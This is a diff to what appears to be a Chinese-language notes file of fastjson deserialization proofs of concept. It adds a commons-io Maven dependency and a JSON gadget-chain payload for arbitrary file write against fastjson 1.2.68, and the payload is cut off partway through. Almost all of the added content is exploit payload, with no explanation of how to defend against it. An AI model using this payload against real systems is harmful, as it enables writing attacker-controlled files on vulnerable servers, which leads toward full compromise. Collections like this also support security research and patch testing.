@@ -232,7 +232,17 @@ poc:
 ```
 
 
-#### 1.2.68的随缘的文件写入：
+#### 1.2.68 commons-io的随缘的文件写入：
+依赖2.6或者2.4？
+```xml
+        <dependency>
+            <groupId>commons-io</groupId>
+            <artifactId>commons-io</artifactId>
+            <version>2.6</version>
+        </dependency>
+```
+
+payload:
 ```json
 {"cqq":{"@type":"java.util.Currency","val":{"currency":{"writer":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"/Users/xxx/GitProjects/demo/output.txt","encoding":"UTF-8"},"outputStream":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.WriterOutputStream","writeImmediately":true,"bufferSize":4,"charsetName":"UTF-8","writer":{"$ref":"$.currency.writer"}},"charInputStream":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceInputStream","charset":"UTF-8","bufferSize":4,"s":{"@type":"java.lang.String""test by cqq!
 
